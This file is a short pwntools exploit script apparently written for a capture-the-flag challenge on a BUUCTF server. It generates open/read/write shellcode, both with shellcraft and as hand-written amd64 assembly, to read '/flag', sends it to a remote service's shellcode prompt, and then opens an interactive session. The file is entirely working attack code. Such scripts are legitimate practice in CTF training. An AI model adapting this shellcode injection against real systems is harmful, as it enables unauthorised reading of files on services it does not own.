from pwn import *
context(arch = 'amd64', os = 'linux')

io = remote('node4.buuoj.cn', 25601)

rwx = 0x41414000 + 0x200

o = shellcraft.open('/flag')
r = shellcraft.read(3, rwx, 0x30)
w = shellcraft.write(1, rwx, 0x30)
orw = asm(o+r+w)
#print(o+r+w)
print(hex(len(orw)))

shellcode = '''
	push 0x67616c66
	push 0x2
	pop rax
	mov rdi, rsp
	xor esi, esi
	syscall
	
	mov rdi, rax
	xor rax, rax
	push 0x41414300
	pop rsi
	pop rdx
	syscall

	push 0x1
	pop rax
	mov edi, eax
	syscall
'''
print(hex(len(asm(shellcode))))

orw = asm(shellcode)
io.sendlineafter(b'shellcode: ', orw)

io.interactive()

